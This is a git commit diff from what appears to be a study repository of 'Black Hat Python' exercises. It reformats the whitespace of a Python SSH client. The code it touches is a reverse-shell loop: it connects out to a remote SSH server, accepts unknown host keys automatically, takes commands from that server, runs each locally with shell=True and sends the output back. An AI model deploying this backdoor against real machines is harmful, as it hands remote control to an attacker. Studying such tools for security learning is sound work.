513904b443c45312b1d294278374b26883aba2d8
Rodrigo Souza <rsouza01@gmail.com>
2018-08-04 19:53:54 -0300

    New SSH stuff

--- black_hat_python/bh_sshRcmd.py
+++ black_hat_python/bh_sshRcmd.py
@@ -10,19 +10,26 @@ def ssh_command(ip, user, passwd, command):
     
     #client.load_host_keys('/home/justin/.ssh/known_hosts')
     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-    client.connect(ip, username=user, password=passwd)
+    client.connect(ip, username = user, password = passwd)
     
     ssh_session = client.get_transport().open_session()
     
     if ssh_session.active:
+
         ssh_session.send(command)
+        
         print ssh_session.recv(1024)#read banner
+        
         while True:
             command = ssh_session.recv(1024) #get the command from the SSH server
+        
             try:
+
                 cmd_output = subprocess.check_output(command, shell=True)
                 ssh_session.send(cmd_output)
+
             except Exception, e:
+                
                 ssh_session.send(str(e))
         
         client.close()
